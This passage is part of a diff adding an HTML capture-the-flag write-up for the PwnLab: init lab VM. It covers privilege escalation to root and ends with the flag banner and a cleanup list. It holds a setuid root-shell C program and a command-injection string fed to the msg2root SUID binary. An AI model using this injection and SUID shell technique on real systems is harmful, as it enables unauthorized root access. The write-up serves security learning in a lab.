+    </div>
+    <div>[...snip...]</div>
+</div>
+<div><br /></div>
+<div>Looks like this one takes a message from the user and then prints it to /root/messages.txt. The path to echo is fully qualified (so we can't pull off the same trick as before), but we can probably abuse the input string. Since we used a fancy C program to "be like mike", let's use a fancy C program to get root. We'll drop our C code in /tmp.</div>
+<div><br /></div>
+<div class="note"><b>NOTE:</b> To cat the file below, I had to fix my PATH so the version of cat in /home/kane wasn't the first choice.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>mike@pwnlab:/tmp$ cat getroot.c</div>
+    <div>#include &lt;unistd.h&gt;</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>main( int argc, char ** argv, char ** envp )</div>
+    <div>{</div>
+    <div>    setgid(0);</div>
+    <div>    setuid(0);</div>
+    <div>    system("/bin/bash", argv, envp);</div>
+    <div>    return 0;</div>
+    <div>}</div>
+</div>
+<div><br /></div>
+<div>Now we'll run msg2root and pass the following input string.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>test; gcc -o /tmp/getroot /tmp/getroot.c; chmod 4777 /tmp/getroot; /bin/echo test2</div>
+</div>
+<div><br /></div>
+<div>Running it...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>mike@pwnlab:/home/mike$ ./msg2root</div>
+    <div>Message for root: test; gcc -o /tmp/getroot /tmp/getroot.c; chmod 4777 /tmp/getroot; /bin/echo test2</div>
+</div>
+<div><br /></div>
+<div>...then checking /tmp, we have the following file...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>-rwsrwxrwx 1 root     root        5140 May 21 11:30 getroot</div>
+</div>
+<div><br /></div>
+<div>Let's run it.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>mike@pwnlab:/tmp$ ./getroot</div>
+    <div>root@pwnlab:/tmp# id</div>
+    <div>uid=0(root) gid=0(root) groups=0(root),1003(kane)</div>
+</div>
+<div><br /></div>
+<div>Nice! We started as kane, abused one SUID binary to become mike and abused another to become root.</div>
+<div><br /></div>
+<div>Let's get that flag.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@pwnlab:/tmp# cd /root</div>
+    <div>root@pwnlab:/root# cat flag.txt<br /></div>
+    <div>.-=~=-.                                                                 .-=~=-.</div>
+    <div>(__  _)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(__  _)</div>
+    <div>(_ ___)  _____                             _                            (_ ___)</div>
+    <div>(__  _) /  __ \                           | |                           (__  _)</div>
+    <div>( _ __) | /  \/ ___  _ __   __ _ _ __ __ _| |_ ___                      ( _ __)</div>
+    <div>(__  _) | |    / _ \| '_ \ / _` | '__/ _` | __/ __|                     (__  _)</div>
+    <div>(_ ___) | \__/\ (_) | | | | (_| | | | (_| | |_\__ \                     (_ ___)</div>
+    <div>(__  _)  \____/\___/|_| |_|\__, |_|  \__,_|\__|___/                     (__  _)</div>
+    <div>( _ __)                     __/ |                                       ( _ __)</div>
+    <div>(__  _)                    |___/                                        (__  _)</div>
+    <div>(__  _)                                                                 (__  _)</div>
+    <div>(_ ___) If  you are  reading this,  means  that you have  break 'init'  (_ ___)</div>
+    <div>( _ __) Pwnlab.  I hope  you enjoyed  and thanks  for  your time doing  ( _ __)</div>
+    <div>(__  _) this challenge.                                                 (__  _)</div>
+    <div>(_ ___)                                                                 (_ ___)</div>
+    <div>( _ __) Please send me  your  feedback or your  writeup,  I will  love  ( _ __)</div>
+    <div>(__  _) reading it                                                      (__  _)</div>
+    <div>(__  _)                                                                 (__  _)</div>
+    <div>(__  _)                                             For sniferl4bs.com  (__  _)</div>
+    <div>( _ __)                                claor@PwnLab.net - @Chronicoder  ( _ __)</div>
+    <div>(__  _)                                                                 (__  _)</div>
+    <div>(_ ___)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(_ ___)</div>
+    <div>`-._.-'                                                                 `-._.-'</div>
+</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Pivoting</h2>
+</div>
+<div>N/A</div>
+<div><br /></div>
+<div>
+    <h2>Clean Up</h2>
+</div>
+<div><br /></div>
+<div>*** REMOVE image uploads in /var/www/html/upload (symbolic link to /tmp) ***</div>
+<div>*** REMOVE /home/kane/likemike.c ***</div>
+<div>*** REMOVE /home/kane/cat ***</div>
+<div>*** REMOVE /tmp/getroot.c ***</div>
+<div>*** REMOVE /tmp/getroot ***</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Additional Info</h2>
+</div>
+<div><br /></div>
+<div><br /></div>
